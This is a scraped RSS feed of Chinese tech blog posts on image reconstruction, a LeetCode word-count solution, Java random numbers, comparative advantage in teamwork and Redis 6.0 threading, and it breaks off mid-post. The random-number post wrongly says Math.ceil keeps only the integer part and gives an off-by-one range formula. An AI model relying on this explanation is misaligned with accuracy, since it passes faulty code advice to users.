如果某个单词在其中一个句子中恰好出现一次&amp;#xff0c;在另一个句子中却 没有出现 &amp;#xff0c;那么这个单词就是 不常见的 。 
给你两个 句子 s1 和 s2 &amp;#xff0c;返回所有 不常用单词 的列表。返回列表中单词…阅读更多...随机数生成Math.random double val  Math.random();  生成的是[0,1]之间的浮点数&amp;#xff0c;  生成一个[120.500]区间的随机数 int and  Double.valueOf(Math.ceil(Math.random()*381120)).intValue();Math.ceil只取浮点数的整数部分  Math.random()的实现 private static final class R…阅读更多...从经济学原理看团队分工合作最近我接触到一个经济学概念叫"比较优势"。学过经济学的同学应该很熟悉&amp;#xff0c;但为了让不了解经济学的朋友们也能明白&amp;#xff0c;我们先来解释下什么是比较优势&amp;#xff0c;然后再谈谈为什么我认为这个原理应当被用在团队合作的分工当中。 
比较优势是19世纪初…阅读更多...Redis的6.0以上为啥又支持多线程Redis 在 6.0 版本之前一直采用单线程架构&amp;#xff0c;这是因为 Redis 主要是内存操作&amp;#xff0c;单线程模型足以应对大部分高性能场景。而单线程模型的优势在于避免了多线程带来的上下文切换和锁的开销&amp;#xff0c;使得 Redis 保持极高的性能和简单性。 
然而&amp;#xff0c;随着…阅读更多...Flink算子状态为何只能用ListState？前言 
Flink 将状态是否要按照 key 进行分类&amp;#xff0c;将状态分为键值状态&amp;#xff08;Keyed State&amp;#xff09;和算子状态&amp;#xff08;Operator State&amp;#xff09;两种&amp;#xff0c;两者除了状态本身的作用域不同外&amp;#xff0c;其中算子状态的状态类型更是被 Flink 限制为 Li…阅读更多...算法训练（leetcode）二刷第五天 | 242. 有效的字母异位词、349. 两个数组的交集、202. 快乐数、1. 两数之和刷题记录 242. 有效的字母异位词349. 两个数组的交集202. 快乐数1. 两数之和 242. 有效的字母异位词 
leetcode题目地址 
简单题&amp;#xff0c;哈希表。数组长度为常量&amp;#xff0c;因此空间复杂度为O(1)。 
时间复杂度&amp;#xff1a;  O ( n ) O(n) O(n) 空间复杂度&amp;#xff1a;  O…阅读更多...# Excel 操作大全Excel 操作大全 文章目录 Excel 操作大全单元格文本换行计算SUM 单元格 
文本换行 
设置自动换行&amp;#xff0c;在文本前面使用 AltEnter键即可换行文本前面可以输入空格实现段前缩进的效果  
计算SUM 
求和函数阅读更多...最新文章品牌故事不会写？这个AI指令可能帮你解决大问题用户上下文透传机制详解[网络] [TCP] Linux UDP Socket 学习指南[网络] [TCP] Linux TCP Socket 学习指南251025B. 海啸HarfBuzz概览DW1000芯片帧组成解析实验课收获2025.10.30Revit Api打印当前项目的所有的可打印视图概率递推1microsoft edge webview离线安装包程序员修炼之道：从小工到专家sunpinyin online的简单例子Ubuntu server配置Docker Daemon.json 顽固不生效Ai元人文：价值权衡元能力的培育路径与开源生态构建revit api 事务和事务组Skill Discovery | RGSD：基于高质量参考轨迹，预训练 skill spacerevit api 过滤器获取元素revit 设置参数revit 设置参数和获取参数值《代码大全2》读书笔记2[Vulhub]Sickos靶机渗透revit api共享参数一件有关山寨iPod shuffle 2的往事revit api  加载族文件+放置族实例 创建门图元【AI说】HTML从零基础到精通路径python 进制、编码《代码大全2》读后感二《代码大全2》读后感三程序员修炼之道：跳出 “小工” 陷阱Amped DVRConv与引擎更新38103：音频转视频容器与解码增强使用 Kotlin 结合 Tesseract OCR 识别验证码Copyright @ 2022~2023</description>
      <pubDate>Fri, 31 Oct 2025 15:19:39 +0000</pubDate>
    </item>
    <item>
      <title>图像处理中的图像重建</title>
      <link>https://www.ppmy.cn/news/1540923.html</link>
      <description>首页编程日记开发工具嵌入式服务器运维图像处理中的图像重建news/2025/10/31 23:19:38/图像重建是指通过对观测到的图像或图像数据进行处理和分析，以恢复出原始或高质量的图像。图像重建常用于图像压缩、图像增强、图像修复等应用领域。以下是一些常见的图像重建方法：插值法（Interpolation）：插值法是一种简单而常用的图像重建方法。它通过使用已知像素的信息来估计未知像素的值。常见的插值方法包括最近邻插值、双线性插值、双三次插值等。傅里叶变换重建（Fourier Transform Reconstruction）：傅里叶变换可以将图像转换为频域表示，通过对频域进行处理和滤波，然后再进行逆傅里叶变换，可实现图像的重建。例如，低通滤波可以用于去除图像中的高频噪声，从而恢复出清晰的图像。压缩感知重建（Compressed Sensing Reconstruction）：压缩感知是一种基于稀疏表示的图像重建方法。它通过在采样阶段对图像进行稀疏表示，并利用稀疏性在重建阶段恢复出图像。压缩感知方法在图像压缩和图像重建方面取得了很好的效果。深度学习重建（Deep Learning Reconstruction）：深度学习已经在图像重建领域取得了重要的突破。通过使用深度神经网络，可以学习到图像的高级特征，并实现高质量的图像重建。常见的深度学习模型包括自编码器、生成对抗网络（GAN）等。基于模型的重建（Model-based Reconstruction）：基于模型的重建方法利用先验知识和数学模型来约束图像重建过程。例如，使用正则化方法（如TV正则化、稀疏表示正则化）对图像进行约束，以得到更准确的重建结果。这些图像重建方法各有优劣，适用于不同场景和需求。在选择图像重建方法时，需要综合考虑图像特点、计算复杂度和可用数据等因素，以获得最佳的重建效果。http://www.ppmy.cn/news/1540923.html相关文章【从零开始的LeetCode-算法】884. 两句话中的不常见单词句子 是一串由空格分隔的单词。每个 单词 仅由小写字母组成。 
如果某个单词在其中一个句子中恰好出现一次&amp;#xff0c;在另一个句子中却 没有出现 &amp;#xff0c;那么这个单词就是 不常见的 。 
给你两个 句子 s1 和 s2 &amp;#xff0c;返回所有 不常用单词 的列表。返回列表中单词…阅读更多...随机数生成Math.random double val  Math.random();  生成的是[0,1]之间的浮点数&amp;#xff0c;  生成一个[120.500]区间的随机数 int and  Double.valueOf(Math.ceil(Math.random()*381120)).intValue();Math.ceil只取浮点数的整数部分  Math.random()的实现 private static final class R…阅读更多...从经济学原理看团队分工合作最近我接触到一个经济学概念叫"比较优势"。学过经济学的同学应该很熟悉&amp;#xff0c;但为了让不了解经济学的朋友们也能明白&amp;#xff0c;我们先来解释下什么是比较优势&amp;#xff0c;然后再谈谈为什么我认为这个原理应当被用在团队合作的分工当中。 
比较优势是19世纪初…阅读更多...Redis的6.0以上为啥又支持多线程Redis 在 6.0 版本之前一直采用单线程架构&amp;#xff0c;这是因为 Redis 主要是内存操作&amp;#xff0c;单线程模型足以应对大部分高性能场景。而单线程模型的优势在于避免了多线程带来的上下文切换和锁的开销&amp;#xff0c;使得 Redis 保持极高的性能和简单性。 
然而&amp;#xff0c;随着…阅读更多...Flink算子状态为何只能用ListState？前言 
Flink 将状态是否要按照 key 进行分类&amp;#xff0c;将状态分为键值状态&amp;#xff08;Keyed State&amp;#xff09;和算子状态&amp;#xff08;Operator State&amp;#xff09;两种&amp;#xff0c;两者除了状态本身的作用域不同外&amp;#xff0c;其中算子状态的状态类型更是被 Flink 限制为 Li…阅读更多...算法训练（leetcode）二刷第五天 | 242. 有效的字母异位词、349. 两个数组的交集、202. 快乐数、1. 两数之和刷题记录 242. 有效的字母异位词349. 两个数组的交集202. 快乐数1. 两数之和 242. 有效的字母异位词 
leetcode题目地址 
简单题&amp;#xff0c;哈希表。数组长度为常量&amp;#xff0c;因此空间复杂度为O(1)。 
时间复杂度&amp;#xff1a;  O ( n ) O(n) O(n) 空间复杂度&amp;#xff1a;  O…阅读更多...# Excel 操作大全Excel 操作大全 文章目录 Excel 操作大全单元格文本换行计算SUM 单元格 
文本换行 
设置自动换行&amp;#xff0c;在文本前面使用 AltEnter键即可换行文本前面可以输入空格实现段前缩进的效果  
计算SUM 
求和函数阅读更多...Linux——shell 编程基础基本介绍 shell 变量 环境变量&amp;#xff08;也叫全局变量&amp;#xff09; 位置参数变量 预定义变量 运算符 条件判断 流程控制 
if 单分支&amp;多分支 case 语句 for循环 while 循环 read 读取控制台输入 函数 
系统函数 
basename 获取文件名 
dirname 获取目录路径 
自定义函数 综…阅读更多...最新文章品牌故事不会写？这个AI指令可能帮你解决大问题用户上下文透传机制详解[网络] [TCP] Linux UDP Socket 学习指南[网络] [TCP] Linux TCP Socket 学习指南251025B. 海啸HarfBuzz概览DW1000芯片帧组成解析实验课收获2025.10.30Revit Api打印当前项目的所有的可打印视图概率递推1microsoft edge webview离线安装包程序员修炼之道：从小工到专家sunpinyin online的简单例子Ubuntu server配置Docker Daemon.json 顽固不生效Ai元人文：价值权衡元能力的培育路径与开源生态构建revit api 事务和事务组Skill Discovery | RGSD：基于高质量参考轨迹，预训练 skill spacerevit api 过滤器获取元素revit 设置参数revit 设置参数和获取参数值《代码大全2》读书笔记2[Vulhub]Sickos靶机渗透revit api共享参数一件有关山寨iPod shuffle 2的往事revit api  加载族文件+放置族实例 创建门图元【AI说】HTML从零基础到精通路径python 进制、编码《代码大全2》读后感二《代码大全2》读后感三程序员修炼之道：跳出 “小工” 陷阱Amped DVRConv与引擎更新38103：音频转视频容器与解码增强使用 Kotlin 结合 Tesseract OCR 识别验证码Copyright @ 2022~2023</description>
      <pubDate>Fri, 31 Oct 2025 15:19:38 +0000</pubDate>
    </item>
    <item>
      <title>【从零开始的LeetCode-算法】884. 两句话中的不常见单词</title>
      <link>https://www.ppmy.cn/news/1540922.html</link>
      <description>首页编程日记开发工具嵌入式服务器运维【从零开始的LeetCode-算法】884. 两句话中的不常见单词news/2025/10/31 23:19:37/句子是一串由空格分隔的单词。每个单词仅由小写字母组成。如果某个单词在其中一个句子中恰好出现一次，在另一个句子中却没有出现，那么这个单词就是不常见的。给你两个句子s1和s2，返回所有不常用单词的列表。返回列表中单词可以按任意顺序组织。示例 1：输入：s1 = "this apple is sweet", s2 = "this apple is sour"输出：["sweet","sour"]示例 2：输入：s1 = "apple apple", s2 = "banana"输出：["banana"]提示：1 &lt;= s1.length, s2.length &lt;= 200s1和s2由小写英文字母和空格组成s1和s2都不含前导或尾随空格s1和s2中的所有单词间均由单个空格分隔我的解答：class Solution {public String[] uncommonFromSentences(String s1, String s2) {String[] str1 = s1.split(" "), str2 = s2.split(" ");Map&lt;String,Integer&gt; map = new HashMap&lt;String,Integer&gt;();List&lt;String&gt; res = new ArrayList&lt;String&gt;();// 将分割好的字符串数组插入map中，计算其元素出现的次数for(String s : str1){map.put(s, map.getOrDefault(s,0) + 1);}for(String s : str2){map.put(s, map.getOrDefault(s,0) + 1);}for(String s : map.keySet()){// 只记录出现次数为1的单词，加入res列表中if(map.get(s) == 1){res.add(s);}}return res.toArray(new String[0]);}
}http://www.ppmy.cn/news/1540922.html相关文章随机数生成Math.random double val  Math.random();  生成的是[0,1]之间的浮点数&amp;#xff0c;  生成一个[120.500]区间的随机数 int and  Double.valueOf(Math.ceil(Math.random()*381120)).intValue();Math.ceil只取浮点数的整数部分  Math.random()的实现 private static final class R…阅读更多...从经济学原理看团队分工合作最近我接触到一个经济学概念叫"比较优势"。学过经济学的同学应该很熟悉&amp;#xff0c;但为了让不了解经济学的朋友们也能明白&amp;#xff0c;我们先来解释下什么是比较优势&amp;#xff0c;然后再谈谈为什么我认为这个原理应当被用在团队合作的分工当中。 
比较优势是19世纪初…阅读更多...Redis的6.0以上为啥又支持多线程Redis 在 6.0 版本之前一直采用单线程架构&amp;#xff0c;这是因为 Redis 主要是内存操作&amp;#xff0c;单线程模型足以应对大部分高性能场景。而单线程模型的优势在于避免了多线程带来的上下文切换和锁的开销&amp;#xff0c;使得 Redis 保持极高的性能和简单性。 
然而&amp;#xff0c;随着…阅读更多...Flink算子状态为何只能用ListState？前言 
Flink 将状态是否要按照 key 进行分类&amp;#xff0c;将状态分为键值状态&amp;#xff08;Keyed State&amp;#xff09;和算子状态&amp;#xff08;Operator State&amp;#xff09;两种&amp;#xff0c;两者除了状态本身的作用域不同外&amp;#xff0c;其中算子状态的状态类型更是被 Flink 限制为 Li…阅读更多...算法训练（leetcode）二刷第五天 | 242. 有效的字母异位词、349. 两个数组的交集、202. 快乐数、1. 两数之和刷题记录 242. 有效的字母异位词349. 两个数组的交集202. 快乐数1. 两数之和 242. 有效的字母异位词 
leetcode题目地址 
简单题&amp;#xff0c;哈希表。数组长度为常量&amp;#xff0c;因此空间复杂度为O(1)。 
时间复杂度&amp;#xff1a;  O ( n ) O(n) O(n) 空间复杂度&amp;#xff1a;  O…阅读更多...# Excel 操作大全Excel 操作大全 文章目录 Excel 操作大全单元格文本换行计算SUM 单元格 
文本换行 
设置自动换行&amp;#xff0c;在文本前面使用 AltEnter键即可换行文本前面可以输入空格实现段前缩进的效果  
计算SUM 
求和函数阅读更多...Linux——shell 编程基础基本介绍 shell 变量 环境变量&amp;#xff08;也叫全局变量&amp;#xff09; 位置参数变量 预定义变量 运算符 条件判断 流程控制 
if 单分支&amp;多分支 case 语句 for循环 while 循环 read 读取控制台输入 函数 
系统函数 
basename 获取文件名 
dirname 获取目录路径 
自定义函数 综…阅读更多...WebSocket Secure (WSS)使用代理浏览器时&amp;#xff0c;WebSocket Secure (WSS) 链接失败可能由以下原因引起&amp;#xff1a; 代理设置问题&amp;#xff1a; 确保代理配置正确&amp;#xff0c;包括代理地址和端口。有些代理服务器不支持WebSocket连接&amp;#xff0c;您需要确认您的代理服务是否支持WSS。 SSL/TLS 问题…阅读更多...最新文章品牌故事不会写？这个AI指令可能帮你解决大问题用户上下文透传机制详解[网络] [TCP] Linux UDP Socket 学习指南[网络] [TCP] Linux TCP Socket 学习指南251025B. 海啸HarfBuzz概览DW1000芯片帧组成解析实验课收获2025.10.30Revit Api打印当前项目的所有的可打印视图概率递推1microsoft edge webview离线安装包程序员修炼之道：从小工到专家sunpinyin online的简单例子Ubuntu server配置Docker Daemon.json 顽固不生效Ai元人文：价值权衡元能力的培育路径与开源生态构建revit api 事务和事务组Skill Discovery | RGSD：基于高质量参考轨迹，预训练 skill spacerevit api 过滤器获取元素revit 设置参数revit 设置参数和获取参数值《代码大全2》读书笔记2[Vulhub]Sickos靶机渗透revit api共享参数一件有关山寨iPod shuffle 2的往事revit api  加载族文件+放置族实例 创建门图元【AI说】HTML从零基础到精通路径python 进制、编码《代码大全2》读后感二《代码大全2》读后感三程序员修炼之道：跳出 “小工” 陷阱Amped DVRConv与引擎更新38103：音频转视频容器与解码增强使用 Kotlin 结合 Tesseract OCR 识别验证码Copyright @ 2022~2023</description>
      <pubDate>Fri, 31 Oct 2025 15:19:37 +0000</pubDate>
    </item>
    <item>
      <title>随机数生成</title>
      <link>https://www.ppmy.cn/news/1540921.html</link>
      <description>首页编程日记开发工具嵌入式服务器运维随机数生成news/2025/10/31 23:19:36/Math.randomdouble val = Math.random();生成的是[0,1]之间的浮点数，生成一个[120.500]区间的随机数int and = Double.valueOf(Math.ceil(Math.random()*381+120)).intValue();Math.ceil只取浮点数的整数部分Math.random()的实现privatestaticfinalclassRandomNumberGeneratorHolder{staticfinalRandomrandomNumberGenerator=newRandom();}publicstaticdoublerandom(){returnRandomNumberGeneratorHolder.randomNumberGenerator.nextDouble();}Random//以当前时间戳作为随机种子Randomrandom=newRandom();//以固定的数字作为随机种子，好处是每次执行时生成的随机数是一致的，便于场景复现Randomrandom2=newRandom(10);//[0,max)间的随机数random.nextInt(max);//随机返回true/falserandom.nextBoolean();//随机长整数random.nextLong();//随机浮点数random.nextFloat();random.nextDouble();http://www.ppmy.cn/news/1540921.html相关文章从经济学原理看团队分工合作最近我接触到一个经济学概念叫"比较优势"。学过经济学的同学应该很熟悉&amp;#xff0c;但为了让不了解经济学的朋友们也能明白&amp;#xff0c;我们先来解释下什么是比较优势&amp;#xff0c;然后再谈谈为什么我认为这个原理应当被用在团队合作的分工当中。 
比较优势是19世纪初…阅读更多...Redis的6.0以上为啥又支持多线程Redis 在 6.0 版本之前一直采用单线程架构&amp;#xff0c;这是因为 Redis 主要是内存操作&amp;#xff0c;单线程模型足以应对大部分高性能场景。而单线程模型的优势在于避免了多线程带来的上下文切换和锁的开销&amp;#xff0c;使得 Redis 保持极高的性能和简单性。 
然而&amp;#xff0c;随着…阅读更多...Flink算子状态为何只能用ListState？前言 
Flink 将状态是否要按照 key 进行分类&amp;#xff0c;将状态分为键值状态&amp;#xff08;Keyed State&amp;#xff09;和算子状态&amp;#xff08;Operator State&amp;#xff09;两种&amp;#xff0c;两者除了状态本身的作用域不同外&amp;#xff0c;其中算子状态的状态类型更是被 Flink 限制为 Li…阅读更多...算法训练（leetcode）二刷第五天 | 242. 有效的字母异位词、349. 两个数组的交集、202. 快乐数、1. 两数之和刷题记录 242. 有效的字母异位词349. 两个数组的交集202. 快乐数1. 两数之和 242. 有效的字母异位词 
leetcode题目地址 
简单题&amp;#xff0c;哈希表。数组长度为常量&amp;#xff0c;因此空间复杂度为O(1)。 
时间复杂度&amp;#xff1a;  O ( n ) O(n) O(n) 空间复杂度&amp;#xff1a;  O…阅读更多...# Excel 操作大全Excel 操作大全 文章目录 Excel 操作大全单元格文本换行计算SUM 单元格 
文本换行 
设置自动换行&amp;#xff0c;在文本前面使用 AltEnter键即可换行文本前面可以输入空格实现段前缩进的效果  
计算SUM 
求和函数阅读更多...Linux——shell 编程基础基本介绍 shell 变量 环境变量&amp;#xff08;也叫全局变量&amp;#xff09; 位置参数变量 预定义变量 运算符 条件判断 流程控制 
if 单分支&amp;多分支 case 语句 for循环 while 循环 read 读取控制台输入 函数 
系统函数 
basename 获取文件名 
dirname 获取目录路径 
自定义函数 综…阅读更多...WebSocket Secure (WSS)使用代理浏览器时&amp;#xff0c;WebSocket Secure (WSS) 链接失败可能由以下原因引起&amp;#xff1a; 代理设置问题&amp;#xff1a; 确保代理配置正确&amp;#xff0c;包括代理地址和端口。有些代理服务器不支持WebSocket连接&amp;#xff0c;您需要确认您的代理服务是否支持WSS。 SSL/TLS 问题…阅读更多...用动态IP软件改变IP地址：探索原理与实用指南‌在数字时代&amp;#xff0c;网络的普及让我们的生活与工作更加便捷&amp;#xff0c;但同时也带来了一系列新的挑战。地域限制、反爬虫机制等问题逐渐凸显&amp;#xff0c;成为了许多网络用户和企业在享受网络便利时必须面对的难题。为了解决这些问题&amp;#xff0c;动态IP软件应运而生&amp;#xf…阅读更多...最新文章品牌故事不会写？这个AI指令可能帮你解决大问题用户上下文透传机制详解[网络] [TCP] Linux UDP Socket 学习指南[网络] [TCP] Linux TCP Socket 学习指南251025B. 海啸HarfBuzz概览DW1000芯片帧组成解析实验课收获2025.10.30Revit Api打印当前项目的所有的可打印视图概率递推1microsoft edge webview离线安装包程序员修炼之道：从小工到专家sunpinyin online的简单例子Ubuntu server配置Docker Daemon.json 顽固不生效Ai元人文：价值权衡元能力的培育路径与开源生态构建revit api 事务和事务组Skill Discovery | RGSD：基于高质量参考轨迹，预训练 skill spacerevit api 过滤器获取元素revit 设置参数revit 设置参数和获取参数值《代码大全2》读书笔记2[Vulhub]Sickos靶机渗透revit api共享参数一件有关山寨iPod shuffle 2的往事revit api  加载族文件+放置族实例 创建门图元【AI说】HTML从零基础到精通路径python 进制、编码《代码大全2》读后感二《代码大全2》读后感三程序员修炼之道：跳出 “小工” 陷阱Amped DVRConv与引擎更新38103：音频转视频容器与解码增强使用 Kotlin 结合 Tesseract OCR 识别验证码Copyright @ 2022~2023</description>
      <pubDate>Fri, 31 Oct 2025 15:19:36 +0000</pubDate>
    </item>
    <item>
      <title>从经济学原理看团队分工合作</title>
      <link>https://www.ppmy.cn/news/1540920.html</link>
      <description>首页编程日记开发工具嵌入式服务器运维从经济学原理看团队分工合作news/2025/10/31 23:19:35/最近我接触到一个经济学概念叫"比较优势"。学过经济学的同学应该很熟悉，但为了让不了解经济学的朋友们也能明白，我们先来解释下什么是比较优势，然后再谈谈为什么我认为这个原理应当被用在团队合作的分工当中。比较优势是19世纪初英国经济学家大卫·李嘉图提出的。它指出，即便一个国家或个人在生产所有商品上都占优势，仍能从贸易或合作中受益。乍一看，这个概念似乎有悖常理。如果我在所有方面都更强，为什么还要和别人合作呢?为了理解这一点，让我们来看《经济学原理》中的一个例子。假设有两个人，Frank和Ruby，他们都能生产牛肉和土豆，但效率各不相同:生产1单位牛肉所需时间(分钟)生产1单位土豆所需时间(分钟)Frank6015Ruby2010从表格可以看出，Ruby在生产牛肉和土豆上都比Frank快。那么，Frank是不是应该什么都自己做呢？让我们仔细分析一下。虽然Ruby生产两种商品都更快，但她生产1份牛肉的时间只能生产2份土豆，而Frank生产1份牛肉的时间却能生产4份土豆。这意味着Frank在生产土豆上有较高的相对优势，即生产土豆的机会成本更低。相反，Ruby生产1份土豆的时间可以生产0.5份牛肉，Frank则只能生产0.25份，所以Ruby在生产牛肉上有相对优势。假设他们各自独立生产，每人有120分钟的劳动时间。Frank最多可以生产2份牛肉或8份土豆，Ruby最多可以生产6份牛肉或12份土豆。如果Frank选择生产8份土豆，Ruby选择生产3份牛肉和6份土豆。现在，如果他们合作，并约定以1份牛肉换3份土豆的比例交换，会怎样呢?Ruby专门生产牛肉，可以生产6份。Frank专门生产土豆，可以生产8份。Frank: 用6份土豆换Ruby的2份牛肉。最终他拥有2份牛肉和2份土豆，比单干时只有土豆要好。Ruby: 用2份牛肉换Frank的6份土豆。最终她拥有4份牛肉和6份土豆，比单干时的3份牛肉6份土豆更多。这个例子清楚地展示了比较优势的概念和通过贸易获利的方式。即使Ruby在两种商品的生产上都更强，Frank在生产土豆上的相对效率更高。这说明，即便一方在所有领域都更强，双方仍能通过专注于各自的相对优势领域，并合理交换来实现双赢。那么，这个经济学原理对团队合作有什么启示呢？我认为很有借鉴意义。在团队中，每个人都有长处和短处，就像Frank和Ruby一样。有些人可能多才多艺，像团队里的"Ruby"，技能全面。有些人可能只在某些方面特别出色，像团队里的"Frank"，在某个细分领域很有一套。如果团队成员各自为战，每个人都想包办所有任务，团队效率就会大打折扣。就像Frank和Ruby各自独立生产，总产量有限。相反，如果团队成员能根据各自的比较优势分工合作，专注于自己最拿手的领域，团队整体产出就会显著提高。就像Ruby专攻牛肉，Frank专攻土豆，最终得到了比单干更多的牛肉和土豆。这在实际工作中很常见。比如，一个项目组可能需要写报告、开发软件、做市场调研等各种任务。如果组里有人特别擅长写报告，即便他也懂软件开发，但把写报告的活儿交给他负责，让更擅长开发的人专心写代码，团队效率会更高。当然，比较优势理论用到团队合作中也要考虑实际情况:沟通成本:团队成员需要清楚彼此的优缺点，这需要有效沟通和信息共享。技能互补:团队成员的技能最好能互补，这样才能充分发挥比较优势。学习成长:团队成员应该不断学习提升，以适应新需求，在新领域发展比较优势。灵活分工:实际工作中，任务分配需要根据具体情况调整，不能一成不变。总之，比较优势理论为团队合作提供了重要视角。通过识别和利用团队成员的比较优势，可以最大化团队整体效率，实现共赢。这提醒我们，团队合作的关键不在于每个人都成为全能选手，而在于每个人都能在团队中找准定位，发挥最大价值。一个高效的团队，应该是一个能充分发挥每个成员比较优势的团队，这点也和贝尔宾团队角色理论不谋而合。但是，凡事有利就有弊端，比较优势的应用明显会鼓励明确分工，这个理论也印证了亚当斯密分工制的有效性，所以我认为其弊端也来自于分工制度，职责过度的单一话，虽然可以明显天生效率，但也限制了个人全方位的发展，尤其是在当今迅速变化的社会中，身兼多职才更可能活下去，毕竟你今天可能干这这个，明天就要被迫去干别的事了。明确分工只适用于流程固化的工作中，比如工厂中的流水线，在职责和工作事项多变的环境中反而弱化分工效率会更高，记住凡事不可绝对，要把握分寸。http://www.ppmy.cn/news/1540920.html相关文章Redis的6.0以上为啥又支持多线程Redis 在 6.0 版本之前一直采用单线程架构&amp;#xff0c;这是因为 Redis 主要是内存操作&amp;#xff0c;单线程模型足以应对大部分高性能场景。而单线程模型的优势在于避免了多线程带来的上下文切换和锁的开销&amp;#xff0c;使得 Redis 保持极高的性能和简单性。 
然而&amp;#xff0c;随着…阅读更多...Flink算子状态为何只能用ListState？前言 
Flink 将状态是否要按照 key 进行分类&amp;#xff0c;将状态分为键值状态&amp;#xff08;Keyed State&amp;#xff09;和算子状态&amp;#xff08;Operator State&amp;#xff09;两种&amp;#xff0c;两者除了状态本身的作用域不同外&amp;#xff0c;其中算子状态的状态类型更是被 Flink 限制为 Li…阅读更多...算法训练（leetcode）二刷第五天 | 242. 有效的字母异位词、349. 两个数组的交集、202. 快乐数、1. 两数之和刷题记录 242. 有效的字母异位词349. 两个数组的交集202. 快乐数1. 两数之和 242. 有效的字母异位词 
leetcode题目地址 
简单题&amp;#xff0c;哈希表。数组长度为常量&amp;#xff0c;因此空间复杂度为O(1)。 
时间复杂度&amp;#xff1a;  O ( n ) O(n) O(n) 空间复杂度&amp;#xff1a;  O…阅读更多...# Excel 操作大全Excel 操作大全 文章目录 Excel 操作大全单元格文本换行计算SUM 单元格 
文本换行 
设置自动换行&amp;#xff0c;在文本前面使用 AltEnter键即可换行文本前面可以输入空格实现段前缩进的效果  
计算SUM 
求和函数阅读更多...Linux——shell 编程基础基本介绍 shell 变量 环境变量&amp;#xff08;也叫全局变量&amp;#xff09; 位置参数变量 预定义变量 运算符 条件判断 流程控制 
if 单分支&amp;多分支 case 语句 for循环 while 循环 read 读取控制台输入 函数 
系统函数 
basename 获取文件名 
dirname 获取目录路径 
自定义函数 综…阅读更多...WebSocket Secure (WSS)使用代理浏览器时&amp;#xff0c;WebSocket Secure (WSS) 链接失败可能由以下原因引起&amp;#xff1a; 代理设置问题&amp;#xff1a; 确保代理配置正确&amp;#xff0c;包括代理地址和端口。有些代理服务器不支持WebSocket连接&amp;#xff0c;您需要确认您的代理服务是否支持WSS。 SSL/TLS 问题…阅读更多...用动态IP软件改变IP地址：探索原理与实用指南‌在数字时代&amp;#xff0c;网络的普及让我们的生活与工作更加便捷&amp;#xff0c;但同时也带来了一系列新的挑战。地域限制、反爬虫机制等问题逐渐凸显&amp;#xff0c;成为了许多网络用户和企业在享受网络便利时必须面对的难题。为了解决这些问题&amp;#xff0c;动态IP软件应运而生&amp;#xf…阅读更多...数据库权限提升GetShell数据库提权总结 - 随风kali - 博客园 (cnblogs.com) 
MySQL 漏洞利用与提权 | 国光 (sqlsec.com) 
sql注入getshell的几种方式 
第99天&amp;#xff1a;权限提升-数据库提权&amp;口令获取&amp;MYSQL&amp;MSSQL&amp;Oracle&amp;MSF 
SQL注入拿shell的方式应该是通用的得到连接数据库…阅读更多...最新文章品牌故事不会写？这个AI指令可能帮你解决大问题用户上下文透传机制详解[网络] [TCP] Linux UDP Socket 学习指南[网络] [TCP] Linux TCP Socket 学习指南251025B. 海啸HarfBuzz概览DW1000芯片帧组成解析实验课收获2025.10.30Revit Api打印当前项目的所有的可打印视图概率递推1microsoft edge webview离线安装包程序员修炼之道：从小工到专家sunpinyin online的简单例子Ubuntu server配置Docker Daemon.json 顽固不生效Ai元人文：价值权衡元能力的培育路径与开源生态构建revit api 事务和事务组Skill Discovery | RGSD：基于高质量参考轨迹，预训练 skill spacerevit api 过滤器获取元素revit 设置参数revit 设置参数和获取参数值《代码大全2》读书笔记2[Vulhub]Sickos靶机渗透revit api共享参数一件有关山寨iPod shuffle 2的往事revit api  加载族文件+放置族实例 创建门图元【AI说】HTML从零基础到精通路径python 进制、编码《代码大全2》读后感二《代码大全2》读后感三程序员修炼之道：跳出 “小工” 陷阱Amped DVRConv与引擎更新38103：音频转视频容器与解码增强使用 Kotlin 结合 Tesseract OCR 识别验证码Copyright @ 2022~2023</description>
      <pubDate>Fri, 31 Oct 2025 15:19:36 +0000</pubDate>
    </item>
    <item>
      <title>Redis的6.0以上为啥又支持多线程</title>
      <link>https://www.ppmy.cn/news/1540919.html</link>
      <description>首页编程日记开发工具嵌入式服务器运维Redis的6.0以上为啥又支持多线程news/2025/10/31 23:19:34/Redis 在 6.0 版本之前一直采用单线程架构，这是因为 Redis 主要是内存操作，单线程模型足以应对大部分高性能场景。而单线程模型的优势在于避免了多线程带来的上下文切换和锁的开销，使得 Redis 保持极高的性能和简单性。然而，随着 Redis 被广泛应用于更复杂的场景，尤其是在处理网络 I/O 密集型任务时，单线程的局限性逐渐显现。为了更好地应对这些情况，Redis 从 6.0 版本开始引入了多线程支持，但主要用于优化特定操作。具体原因如下：1.网络 I/O 和 CPU 密集型任务的分离Redis 的性能瓶颈通常不是 CPU，而是网络 I/O 的处理。例如，处理大量连接、发送和接收大量数据包时，单线程需要同步处理每个连接的 I/O 操作，这会影响整体的吞吐量。引入多线程后，Redis 可以在多线程中处理 I/O 操作，如接受客户端请求、解析数据和发送响应，而保持数据操作仍然是单线程处理，这避免了复杂的并发控制。2.提高网络性能Redis 6.0 的多线程模式将网络 I/O部分分摊给多个线程执行，这样多个客户端的 I/O 操作可以并行处理，减少了请求排队等待时间，提高了在高并发场景下的响应能力。3.保持数据一致性的简单性尽管 Redis 6.0 引入了多线程，但它仍然保持数据操作（如读写数据）的单线程模型。这样可以避免复杂的多线程并发问题和锁机制带来的性能损耗。通过这种设计，Redis 既能提升 I/O 处理能力，又不会影响核心数据的简单性和一致性。4.提升大数据量处理的效率对于大批量数据的序列化和反序列化操作（如 AOF 日志写入和 RDB 快照生成），多线程可以显著提高效率。这些操作在单线程下可能会拖慢 Redis 的性能，而多线程则可以让这些任务并发执行，减少阻塞。小结Redis 6.0 引入多线程是为了优化网络 I/O和批量数据处理的性能，而核心的数据操作依然保持单线程模型，以确保简单性和一致性。这种设计在不引入多线程锁复杂性的情况下，极大提升了高并发场景下的性能。在引入多线程后，如何解决并发带来的线程安全问题呢在 Redis 6.0 引入多线程后，为了解决并发带来的线程安全问题，采用了以下几种策略和设计原则：1.数据操作仍然是单线程Redis 的核心数据操作（如读写数据）仍然是在单线程中进行的。这意味着所有对数据的修改（如SET、GET、DELETE等操作）依然是串行化处理的。这样可以保证数据的一致性和完整性，避免并发修改导致的数据竞争和不一致问题。2.I/O 多线程处理Redis 6.0 中的多线程主要用于处理网络 I/O，而不是数据操作。这意味着多个线程可以并行处理客户端的请求、接收和发送数据，从而提升网络处理能力。I/O 操作和数据操作是分开的，这样在 I/O 线程中发生的操作不会影响到数据的一致性。3.使用锁和原子操作对于需要共享数据的场景，Redis 